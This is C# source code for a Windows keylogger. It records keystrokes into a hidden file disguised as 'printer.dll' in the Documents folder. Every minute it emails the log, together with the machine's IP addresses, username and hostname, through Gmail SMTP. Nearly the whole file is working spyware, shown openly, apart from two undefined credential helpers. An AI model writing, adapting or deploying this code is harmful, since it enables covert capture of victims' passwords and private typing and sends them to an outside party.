using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;

class Program
{
    [DllImport("User32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    static long numkeystrokes = 0;
    static int MINUTE_LENGTH = 1; // every 1 minutes send an email with all logged content

    public static void Main(string[] args)
    {
        String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        if (!Directory.Exists(filepath))
        {
            Directory.CreateDirectory(filepath);
        }

        string path = (filepath + @"\printer.dll");

        if (!File.Exists(path))
        {
            using (StreamWriter sw = File.CreateText(path))
            {

            }
        }
        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);

        // 3. periodically send the contents of the file to an external email address
        var startTimeSpan = TimeSpan.Zero;
        var periodTimeSpan = TimeSpan.FromMinutes(MINUTE_LENGTH);

        var timer = new Timer((e) =>
        {
            SendNewMessage();
        }, null, startTimeSpan, periodTimeSpan);

        // 1. capture keystrokes and display to consol
        while (true)
        {
            Thread.Sleep(5);
            // check all keys
            for (int i = 32; i < 127; ++i)
            {
                int keystate = GetAsyncKeyState(i);
                if (keystate == 32769)
                {
                    numkeystrokes++;
                    // 2. type strokes into a textfile
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.Write((char)i);
                    }
                }
            }

        }

    }

    static void SendNewMessage()
    {

        // send the contents of the text file to an external email address.
        String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string filepath = folderName + @"\printer.dll"; // change to printer.dll
        String logContents = File.ReadAllText(filepath);

        using (StreamWriter sw = File.AppendText(filepath))
        {
            sw.Write("\n");
        }

        // create an email message
        string emailBody = "";

        DateTime now = DateTime.Now;
        string subject = "Message from keylogger";
        var host = Dns.GetHostEntry(Dns.GetHostName());

        foreach (var address in host.AddressList)
        {
            emailBody += "Address: " + address + "\n";
        }
        emailBody += "User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
        emailBody += "\nHost " + host;
        emailBody += "\nTime: " + now.ToString();
        emailBody += "\n''''\n" + logContents;
        if (numkeystrokes == 1)
        {
            emailBody += "\n''''\nLogged " + numkeystrokes.ToString() + " new keystroke in the last 5 minutes.";
        }
        else
        {
            emailBody += "\n''''\nLogged " + numkeystrokes.ToString() + " keystrokes in the last 5 minutes.";
        }
        numkeystrokes = 0; // reset numkeystrokes

        SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
        MailMessage mailMessage = new MailMessage
        {
            From = new MailAddress(getEmail())
        };
        mailMessage.To.Add(getEmail());
        mailMessage.Subject = subject;
        client.UseDefaultCredentials = false;
        client.EnableSsl = true;
        client.Credentials = new NetworkCredential(getEmail(), getPassword());
        mailMessage.Body = emailBody;

        client.Send(mailMessage);
    }
}